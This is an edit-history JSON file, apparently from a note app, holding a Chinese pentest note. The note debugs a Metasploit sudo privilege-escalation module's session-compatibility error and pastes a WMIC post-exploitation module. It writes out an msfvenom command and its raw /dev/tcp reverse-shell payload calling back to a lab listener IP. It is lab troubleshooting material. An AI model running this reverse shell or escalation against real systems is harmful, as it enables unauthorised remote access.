{"compress":true,"commitItems":[["0fcf1c50-b87a-4e85-9163-1083b932b8a1",1608375452914,"",[[1608375411879,["whale@Whale",[[1,0,"msf报错\n===\n\n\n[!] SESSION may not be compatible with this module."]],[0,0],[63,63]]],[1608375412589,["whale@Whale",[[1,63,"\n\n"]],[63,63],[64,64]]],[1608375412597,["whale@Whale",[[-1,64,"\n"],[1,65,"、"]],[64,64],[65,65]]],[1608375413309,["whale@Whale",[[-1,64,"、"],[1,65,"\n"]],[65,65],[64,64]]],[1608375499321,["whale@Whale",[[1,10,"p"]],[10,14],[10,11]]],[1608375499887,["whale@Whale",[[1,11,"k"]],[10,11],[10,12]]],[1608375500236,["whale@Whale",[[1,11,"'"],[1,12,"'l"]],[10,12],[10,15]]],[1608375500632,["whale@Whale",[[-1,11,"'"],[-1,13,"'"]],[10,15],[10,13]]],[1608375501379,["whale@Whale",[[1,13,".exe"]],[13,13],[17,17]]],[1608375954198,["whale@Whale",[[-1,10,"pkl.exe"]],[10,17],[10,10]]],[1608375964797,["whale@Whale",[[1,11,"![4]($res/4.PNG)\n\n"]],[10,10],[28,28]]],[1608376001986,["whale@Whale",[[1,10,"a"]],[10,10],[11,11]]],[1608376002316,["whale@Whale",[[-1,10,"a"]],[11,11],[10,10]]],[1608376002495,["whale@Whale",[[1,10,"q"]],[10,10],[11,11]]],[1608376002953,["whale@Whale",[[-1,10,"q"]],[11,11],[10,10]]],[1608376005428,["whale@Whale",[[1,10,"起因："]],[10,10],[13,13]]],[1608376007013,["whale@Whale",[[1,14,"\n"]],[13,13],[14,14]]],[1608376018569,["whale@Whale",[[1,13,"sudo -s提权一直报错，"]],[13,13],[27,27]]],[1608376022988,["whale@Whale",[[-1,22,"一直报错，"]],[27,27],[22,22]]],[1608376025769,["whale@Whale",[[1,22,"在msf上"]],[22,22],[27,27]]],[1608376029875,["whale@Whale",[[1,27,"一直报错，"]],[27,27],[32,32]]],[1608376052579,["whale@Whale",[[1,5,"（）"]],[5,5],[7,7]]],[1608376053771,["whale@Whale",[[1,6,"SESSION may not be compatible"]],[6,6],[35,35]]],[1608376070180,["whale@Whale",[[1,63,"但是在靶机上是可以运行的。"]],[63,63],[76,76]]],[1608376082750,["whale@Whale",[[-1,72,"运行的。"]],[76,76],[72,72]]],[1608376086281,["whale@Whale",[[1,72,"成功提权的。"]],[72,72],[78,78]]],[1608376257325,["whale@Whale",[[1,80,"\n"]],[78,78],[79,79]]],[1608376257557,["whale@Whale",[[1,81,"\n"]],[79,79],[80,80]]],[1608376262816,["whale@Whale",[[1,80,"在"]],[80,80],[81,81]]],[1608376266484,["whale@Whale",[[-1,80,"在"]],[81,81],[80,80]]],[1608376292652,["whale@Whale",[[1,80,"msf有一个模块，叫做post/multi/manage/sudo"]],[80,80],[113,113]]],[1608376294476,["whale@Whale",[[1,91,"·"]],[91,91],[92,92]]],[1608376295782,["whale@Whale",[[-1,91,"·"]],[92,92],[91,91]]],[1608376296147,["whale@Whale",[[1,91,"`"]],[91,91],[92,92]]],[1608376296718,["whale@Whale",[[1,114,"`"]],[114,114],[115,115]]],[1608376342348,["whale@Whale",[[1,117,"\n"]],[116,116],[117,117]]],[1608376344828,["whale@Whale",[[1,117,"kna"]],[117,117],[120,120]]],[1608376345597,["whale@Whale",[[-1,117,"kna"]],[120,120],[117,117]]],[1608376359924,["whale@Whale",[[1,117,"看过这个模块的源码，就是使用sudo -s来提权的。所以"]],[117,117],[145,145]]],[1608376361360,["whale@Whale",[[1,145,"为什么"]],[145,145],[148,148]]],[1608376363022,["whale@Whale",[[-1,143,"所以为什么"]],[148,148],[143,143]]],[1608376368115,["whale@Whale",[[1,143,"为什么会提权失败呢？"]],[143,143],[153,153]]],[1608376370772,["whale@Whale",[[1,143,"\n"]],[143,143],[144,144]]],[1608376371029,["whale@Whale",[[1,144,"\n"]],[144,144],[145,145]]],[1608376374260,["whale@Whale",[[1,41,"## "]],[41,41],[44,44]]],[1608376382927,["whale@Whale",[[1,177,"## ji"]],[177,177],[182,182]]],[1608376383398,["whale@Whale",[[-1,180,"ji"]],[182,182],[180,180]]],[1608376385044,["whale@Whale",[[1,180,"解决"]],[180,180],[182,182]]],[1608376386083,["whale@Whale",[[-1,180,"解决"]],[182,182],[180,180]]],[1608376392731,["whale@Whale",[[1,180,"环境配置复现，debug"]],[180,180],[192,192]]],[1608376394244,["whale@Whale",[[1,193,"\n"]],[192,192],[193,193]]],[1608376394773,["whale@Whale",[[1,194,"\n"]],[193,193],[194,194]]],[1608376395067,["whale@Whale",[[1,195,"\n"]],[194,194],[195,195]]],[1608376436190,["whale@Whale",[[1,193,"msfvenom -p cmd/unix/reverse_bash  lhost=192.168.123.123 lport=6677 -f raw      \r\n"]],[193,193],[275,275]]],[1608376439116,["whale@Whale",[[1,193,"\n"],[-1,273,"\r"]],[192,192],[193,193]]],[1608376439692,["whale@Whale",[[1,194,"\n"]],[193,193],[194,194]]],[1608376440300,["whale@Whale",[[-1,194,"\n"]],[194,194],[193,193]]],[1608376442688,["whale@Whale",[[1,193,"### sh"]],[193,193],[199,199]]],[1608376443127,["whale@Whale",[[-1,197,"sh"]],[199,199],[197,197]]],[1608376447635,["whale@Whale",[[1,197,"生成反弹shell的载荷"]],[197,197],[209,209]]],[1608376450036,["whale@Whale",[[1,294,"\n"]],[290,290],[291,291]]],[1608376450508,["whale@Whale",[[1,295,"\n"]],[291,291],[292,292]]],[1608376452288,["whale@Whale",[[1,292,"### "]],[292,292],[296,296]]],[1608376471474,["whale@Whale",[[1,291,"0<&165-;exec 165<>/dev/tcp/192.168.123.123/6677;sh <&165 >&165 2>&165"]],[291,291],[360,360]]],[1608376473293,["whale@Whale",[[1,291,"\n"]],[291,291],[292,292]]],[1608376474900,["whale@Whale",[[1,210,"\n"]],[210,210],[211,211]]],[1608376475188,["whale@Whale",[[1,211,"·"]],[211,211],[212,212]]],[1608376476204,["whale@Whale",[[-1,211,"·"]],[212,212],[211,211]]],[1608376477833,["whale@Whale",[[1,210,"```"]],[210,210],[213,213]]],[1608376480893,["whale@Whale",[[1,366,"\n"]],[366,366],[367,367]]],[1608376481942,["whale@Whale",[[1,366,"```"]],[366,366],[369,369]]],[1608376549282,["whale@Whale",[[1,197,"sh"]],[197,197],[199,199]]],[1608376549767,["whale@Whale",[[-1,197,"sh"]],[199,199],[197,197]]],[1608376553303,["whale@Whale",[[1,193,"\n"]],[192,192],[193,193]]],[1608376560866,["whale@Whale",[[1,193,"### 设置msf监听"]],[193,193],[204,204]]],[1608376561005,["whale@Whale",[[1,205,"\n"]],[204,204],[205,205]]],[1608376585244,["whale@Whale",[[1,205,"handler -H 192.168.123.123 -P 6677 -p cmd/unix/reverse_bash"]],[205,205],[264,264]]],[1608376586912,["whale@Whale",[[1,205,"`"]],[205,205],[206,206]]],[1608376587835,["whale@Whale",[[1,265,"`"]],[265,265],[266,266]]],[1608376590261,["whale@Whale",[[1,267,"\n"]],[267,267],[268,268]]],[1608376609348,["whale@Whale",[[1,449,"sh"]],[449,449],[451,451]]],[1608376609937,["whale@Whale",[[-1,449,"sh"]],[451,451],[449,449]]],[1608376625834,["whale@Whale",[[1,449,"设置metapreter session"]],[449,449],[469,469]]],[1608376626190,["whale@Whale",[[1,473,"\n"]],[469,469],[470,470]]],[1608376646786,["whale@Whale",[[1,470,"使用上一条命令获得一个shell cmd/unix"]],[470,470],[495,495]]],[1608376649329,["whale@Whale",[[1,481,"`"]],[481,481],[482,482]]],[1608376651018,["whale@Whale",[[1,496,"`l"]],[496,496],[498,498]]],[1608376651539,["whale@Whale",[[-1,497,"l"]],[498,498],[497,497]]],[1608376660069,["whale@Whale",[[1,497,"类型的shell以后，可以使用·"]],[497,497],[513,513]]],[1608376660264,["whale@Whale",[[1,513,"·"]],[513,513],[514,514]]],[1608376660965,["whale@Whale",[[-1,512,"··"]],[514,514],[512,512]]],[1608376661780,["whale@Whale",[[1,512,"``"]],[512,512],[514,514]]],[1608376664689,["whale@Whale",[[1,513,"session 0"]],[513,513],[522,522]]],[1608376665378,["whale@Whale",[[-1,521,"0"]],[522,522],[521,521]]],[1608376668846,["whale@Whale",[[1,521,"-u 1"]],[521,521],[525,525]]],[1608376669921,["whale@Whale",[[-1,524,"1"]],[525,525],[524,524]]],[1608376670255,["whale@Whale",[[1,524,"id"]],[524,524],[526,526]]],[1608376670782,["whale@Whale",[[-1,524,"id"]],[526,526],[524,524]]],[1608376673530,["whale@Whale",[[1,524,"sessiond"]],[524,524],[532,532]]],[1608376673984,["whale@Whale",[[-1,531,"d"]],[532,532],[531,531]]],[1608376676361,["whale@Whale",[[1,531,"的ID"]],[531,531],[534,534]]],[1608376691547,["whale@Whale",[[1,535," 这种方式，获得一个·"]],[535,535],[546,546]]],[1608376692476,["whale@Whale",[[-1,545,"·"]],[546,546],[545,545]]],[1608376693178,["whale@Whale",[[1,545,"``"]],[545,545],[547,547]]],[1608376694280,["whale@Whale",[[1,546,"meterpreter x86/linux"]],[546,546],[567,567]]],[1608376699443,["whale@Whale",[[1,568,"的session."]],[568,568],[577,577]]],[1608376699766,["whale@Whale",[[-1,576,"."]],[577,577],[576,576]]],[1608376700160,["whale@Whale",[[1,576,"。"]],[576,576],[577,577]]],[1608376700894,["whale@Whale",[[1,581,"\n"]],[577,577],[578,578]]],[1608376701948,["whale@Whale",[[-1,581,"\n"]],[578,578],[578,578]]],[1608376702326,["whale@Whale",[[-1,580,"\n"]],[578,578],[578,578]]],[1608376706997,["whale@Whale",[[-1,579,"\n"]],[578,578],[578,578]]],[1608380385182,["whale@Whale",[[1,579,"\n"]],[578,578],[579,579]]],[1608380413381,["whale@Whale",[[1,579,"使用meterpreter的session，执行`post/multi/manage/sudo`提权载荷，会报错。"]],[579,579],[636,636]]],[1608380413662,["whale@Whale",[[1,637,"\n"]],[636,636],[637,637]]],[1608380418225,["whale@Whale",[[1,637,"```"]],[637,637],[640,640]]],[1608380419125,["whale@Whale",[[1,693,"```"]],[693,693],[696,696]]],[1608380420901,["whale@Whale",[[1,697,"\n"]],[696,696],[697,697]]],[1608380428538,["whale@Whale",[[-1,697,"\n"],[1,698,"使用shell cmd/unix"]],[697,697],[713,713]]],[1608380438036,["whale@Whale",[[1,699,"`"],[1,713,"`的"]],[699,713],[716,716]]],[1608380442671,["whale@Whale",[[1,716,"载荷不会报错。"]],[716,716],[723,723]]],[1608391296928,["whale@Whale",[[1,723,"\n\n"]],[723,723],[724,724]]],[1608391297104,["whale@Whale",[[1,725,"\n"]],[724,724],[725,725]]],[1608391297911,["whale@Whale",[[1,725," 'SessionTypes'  => [ 'meterpreter', 'shell' ]"]],[725,725],[771,771]]],[1608391590312,["whale@Whale",[[1,725,"\n"]],[724,724],[725,725]]],[1608391591614,["whale@Whale",[[1,725,"## "]],[725,725],[728,728]]],[1608391592299,["whale@Whale",[[-1,727," "]],[728,728],[727,727]]],[1608391596918,["whale@Whale",[[1,727,"# 查看源码"]],[727,727],[733,733]]],[1608391597218,["whale@Whale",[[1,734,"\n"]],[733,733],[734,734]]],[1608391684688,["whale@Whale",[[1,734,"/usr/share/metasploit-framework/modules/post/multi/manage/sudo.rb"]],[734,734],[799,799]]],[1608391686506,["whale@Whale",[[1,734,"vi "]],[734,734],[737,737]]],[1608391691985,["whale@Whale",[[1,734,"\n"]],[733,733],[734,734]]],[1608391692238,["whale@Whale",[[1,734,"```"]],[734,734],[737,737]]],[1608391694992,["whale@Whale",[[1,854,"\n"]],[853,853],[854,854]]],[1608391695234,["whale@Whale",[[1,854,"```"]],[854,854],[857,857]]],[1608391697744,["whale@Whale",[[1,807,"\n"]],[807,807],[808,808]]],[1608391697968,["whale@Whale",[[1,808,"\n"]],[808,808],[809,809]]],[1608391699297,["whale@Whale",[[1,808,"za"]],[808,808],[810,810]]],[1608391700391,["whale@Whale",[[-1,808,"za"]],[810,810],[808,808]]],[1608391700912,["whale@Whale",[[1,808,"zx"]],[808,808],[810,810]]],[1608391701598,["whale@Whale",[[-1,808,"zx"]],[810,810],[808,808]]],[1608391722021,["whale@Whale",[[1,808,"在这一行，如果没有meterpreter这一个关键字，那么就"]],[808,808],[838,838]]],[1608392458911,["whale@Whale",[[-1,809,"这一行"],[1,812,"d"]],[809,812],[809,810]]],[1608392459121,["whale@Whale",[[1,810,"i"]],[809,810],[809,811]]],[1608392459689,["whale@Whale",[[-1,809,"di"],[1,811,"第"]],[809,811],[809,810]]],[1608392461752,["whale@Whale",[[1,810,"32行"]],[810,810],[813,813]]],[1608392481963,["whale@Whale",[[1,839,"只支持shell类型的session"]],[839,839],[857,857]]],[1608392482913,["whale@Whale",[[1,858,"\n"]],[857,857],[858,858]]],[1608392491040,["whale@Whale",[[1,910,"\n"]],[909,909],[910,910]]],[1608392493852,["whale@Whale",[[-1,910,"\n"],[1,911,"## r"]],[910,910],[914,914]]],[1608392494987,["whale@Whale",[[-1,912," r"]],[914,914],[912,912]]],[1608392496055,["whale@Whale",[[1,912,"# ru"]],[912,912],[916,916]]],[1608392496533,["whale@Whale",[[-1,914,"ru"]],[916,916],[914,914]]],[1608392499925,["whale@Whale",[[1,914,"如何写自己"]],[914,914],[919,919]]],[1608392505043,["whale@Whale",[[-1,917,"自己"]],[919,919],[917,917]]],[1608392508440,["whale@Whale",[[1,917,"一个msf插件"]],[917,917],[924,924]]],[1608392508801,["whale@Whale",[[1,924,"\n\n"]],[924,924],[925,925]]]]],["beca4833-c019-41c1-96f7-d20d5154c838",1608650041727,"msf报错（SESSION may not be compatible）\n===\n## 起因：sudo -s提权在msf上一直报错，但是在靶机上是可以成功提权的。\n\nmsf有一个模块，叫做`post/multi/manage/sudo`\n\n看过这个模块的源码，就是使用sudo -s来提权的。\n\n为什么会提权失败呢？\n![4]($res/4.PNG)\n\n## 环境配置复现，debug\n### 设置msf监听\n`handler -H 192.168.123.123 -P 6677 -p cmd/unix/reverse_bash`\n\n### 生成反弹shell的载荷\n```\nmsfvenom -p cmd/unix/reverse_bash  lhost=192.168.123.123 lport=6677 -f raw      \n\n0<&165-;exec 165<>/dev/tcp/192.168.123.123/6677;sh <&165 >&165 2>&165\n```\n### 设置metapreter session\n使用上一条命令获得一个`shell cmd/unix`类型的shell以后，可以使用`session -u session的ID` 这种方式，获得一个`meterpreter x86/linux`的session。\n\n使用meterpreter的session，执行`post/multi/manage/sudo`提权载荷，会报错。\n```\n[!] SESSION may not be compatible with this module.\n```\n使用`shell cmd/unix`的载荷不会报错。\n\n### 查看源码\n```\nvi /usr/share/metasploit-framework/modules/post/multi/manage/sudo.rb\n\n在第32行，如果没有meterpreter这一个关键字，那么就只支持shell类型的session\n\n 'SessionTypes'  => [ 'meterpreter', 'shell' ]\n```\n### 如何写一个msf插件\n\n",[[1608649984191,["whale@Whale",[[1,925,"##\r\n# This module requires Metasploit: https://metasploit.com/download\r\n# Current source: https://github.com/rapid7/metasploit-framework\r\n##\r\n\r\nclass MetasploitModule < Msf::Post\r\n  include Msf::Post::Windows::WMIC\r\n\r\n  def initialize(info={})\r\n    super( update_info( info,\r\n      'Name'          => 'Windows Gather Run Specified WMIC Command',\r\n      'Description'   => %q{ This module will execute a given WMIC command options or read\r\n        WMIC commands options from a resource file and execute the commands in the\r\n        specified Meterpreter session.},\r\n      'License'       => MSF_LICENSE,\r\n      'Author'        => [ 'Carlos Perez <carlos_perez[at]darkoperator.com>'],\r\n      'Platform'      => [ 'win' ],\r\n      'SessionTypes'  => [ 'meterpreter' ]\r\n    ))\r\n\r\n    register_options(\r\n      [\r\n        OptPath.new('RESOURCE', [false, 'Full path to resource file to read commands from.']),\r\n        OptString.new('COMMAND', [false, 'WMIC command options.']),\r\n      ])\r\n  end\r\n\r\n  # Run Method for when run command is issued\r\n  def run\r\n        print_status(\"Executing command\")\r\n        command = wmic_query(\"useraccount get name\")\r\n        puts command\r\n  end\r\nend"]],[925,925],[2103,2103]]],[1608649987089,["whale@Whale",[[-1,925,"##\r"],[-1,995,"\r"],[-1,1061,"\r"],[-1,1065,"\r"],[-1,1067,"\r"],[-1,1103,"\r"],[-1,1139,"\r"],[-1,1141,"\r"],[-1,1168,"\r"],[-1,1199,"\r"],[-1,1270,"\r"],[-1,1362,"\r"],[-1,1446,"\r"],[-1,1488,"\r"],[-1,1527,"\r"],[-1,1607,"\r"],[-1,1644,"\r"],[-1,1688,"\r"],[-1,1696,"\r"],[-1,1698,"\r"],[-1,1721,"\r"],[-1,1730,"\r"],[-1,1826,"\r"],[-1,1895,"\r"],[-1,1905,"\r"],[-1,1912,"\r"],[-1,1914,"\r"],[-1,1961,"\r"],[-1,1972,"\r"],[-1,2015,"\r"],[-1,2069,"\r"],[-1,2091,"\r"],[-1,2098,"\r"]],[925,927],[925,925]]],[1608649988432,["whale@Whale",[[1,925,"##\r"],[1,992,"\r"],[1,1057,"\r"],[1,1060,"\r"],[1,1061,"\r"],[1,1096,"\r"],[1,1131,"\r"],[1,1132,"\r"],[1,1158,"\r"],[1,1188,"\r"],[1,1258,"\r"],[1,1349,"\r"],[1,1432,"\r"],[1,1473,"\r"],[1,1511,"\r"],[1,1590,"\r"],[1,1626,"\r"],[1,1669,"\r"],[1,1676,"\r"],[1,1677,"\r"],[1,1699,"\r"],[1,1707,"\r"],[1,1802,"\r"],[1,1870,"\r"],[1,1879,"\r"],[1,1885,"\r"],[1,1886,"\r"],[1,1932,"\r"],[1,1942,"\r"],[1,1984,"\r"],[1,2037,"\r"],[1,2058,"\r"],[1,2064,"\r"]],[925,925],[925,927]]],[1608649989861,["whale@Whale",[[1,925,"\n"],[-1,927,"\r"],[-1,995,"\r"],[-1,1061,"\r"],[-1,1065,"\r"],[-1,1067,"\r"],[-1,1103,"\r"],[-1,1139,"\r"],[-1,1141,"\r"],[-1,1168,"\r"],[-1,1199,"\r"],[-1,1270,"\r"],[-1,1362,"\r"],[-1,1446,"\r"],[-1,1488,"\r"],[-1,1527,"\r"],[-1,1607,"\r"],[-1,1644,"\r"],[-1,1688,"\r"],[-1,1696,"\r"],[-1,1698,"\r"],[-1,1721,"\r"],[-1,1730,"\r"],[-1,1826,"\r"],[-1,1895,"\r"],[-1,1905,"\r"],[-1,1912,"\r"],[-1,1914,"\r"],[-1,1961,"\r"],[-1,1972,"\r"],[-1,2015,"\r"],[-1,2069,"\r"],[-1,2091,"\r"],[-1,2098,"\r"]],[924,924],[925,925]]],[1608649991282,["whale@Whale",[[1,925,"```"]],[925,925],[928,928]]],[1608649993458,["whale@Whale",[[1,2075,"\n"]],[2074,2074],[2075,2075]]],[1608649994282,["whale@Whale",[[-1,2075,"\n"],[1,2076,"```"]],[2075,2075],[2078,2078]]]]]]}